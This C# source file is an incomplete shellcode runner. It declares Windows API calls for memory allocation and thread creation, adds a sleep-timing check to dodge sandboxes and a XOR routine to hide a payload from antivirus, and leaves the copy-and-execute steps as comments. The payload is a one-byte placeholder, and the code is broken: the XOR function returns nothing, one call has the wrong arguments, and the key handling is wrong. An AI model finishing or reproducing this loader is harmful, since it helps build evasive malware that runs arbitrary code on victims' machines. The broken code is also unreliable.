using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ShellcodeRunner
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static byte[] ecksore(byte[] pl, char[] key)
        {
            int j;
            j = 0;  // Inefficiency on purpose!!
            for (int i = 0; i < pl.Length; i++)
            {
                if (j == key.Length-1)
                    continue;
                pl[i] = pl[i] ^ key[j];
                j++;
            }
        }

        static void Main(string[] args)
        {
            // Dealing with HBD
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
                return;

            // Alloc. space
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);  // TODO: obfs. values

            // pl
            byte[] luhmao = new byte[1] {0x41};

            // Dealing with SBD
            luhmao = ecksore(luhmao);

            // Virtual alloc
            // Copy bytes into buffer
            // Create thread (Ex numa?)

            if (mem != null)  // etc
            {
                // do your thing
            }

        }
    }
}
